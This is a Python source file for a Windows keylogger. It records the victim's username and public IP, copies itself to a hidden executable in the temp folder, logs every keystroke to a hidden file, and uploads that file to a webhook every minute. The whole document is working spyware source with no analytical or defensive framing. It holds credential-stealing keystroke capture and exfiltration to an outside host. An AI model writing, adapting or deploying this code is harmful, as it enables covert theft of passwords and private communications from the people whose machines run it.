import ctypes
import sys
import requests
import threading
import time
import os
import shutil
import winreg
from getpass import getuser
from pynput.keyboard import Listener
import tokens

##
u = getuser()
path = os.path.expandvars(f'%TEMP%//{u}_system_meta.txt')
path_e = os.path.expandvars(f'%TEMP%//essen.exe')
webhook_url = tokens.webhook_url
#startup = r'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\essens.exe'
##

#identification
current_file = sys.executable
try:
    ip = public_ip = requests.get('https://api.ipify.org').text
    with open(path, "a") as f:
        f.write(f"{u} {ip}\n")
except:
    pass

#add to startup
shutil.copy2(current_file, path_e)
attribute_set = ctypes.windll.kernel32.SetFileAttributesW(path_e, 0x02)

#log cleaner function
def writetofile(key):
    keydata = str(key)
    keydata = keydata.replace("'", "")
    if keydata == "Key.space":
        keydata = " "
    if keydata == "Key.shift" or keydata == "Key.shift_r":
        keydata = "-SHIFT-"
    if keydata == "Key.backspace":
        keydata = "-BACK-"
    if keydata == "Key.alt_l" or keydata == "Key.alt_r":
        keydata = "-ALT-"
    if keydata == "Key.tab":
        keydata = "-TAB-"
    if keydata == "Key.ctrl_l" or keydata == "Key.ctrl_r":
        keydata = "-CTRL-"
    with open(path, "a") as f:
        f.write(keydata)
    ctypes.windll.kernel32.SetFileAttributesW(path, 0x02)

#sending logfile
def send_logfile(): 
    with open(path, "rb") as f:
        files = {"file": (path, f)}
        attribute_set = ctypes.windll.kernel32.SetFileAttributesW(path, 0x02)
        response = requests.post(webhook_url, files=files)
        print(response.status_code)
    # Schedule next send in 1 minute
    threading.Timer(60, send_logfile).start()

#time interval between sending logs
threading.Timer(60, send_logfile).start()

#start listening to keyboard
with Listener(on_press=writetofile) as l:
    l.join()
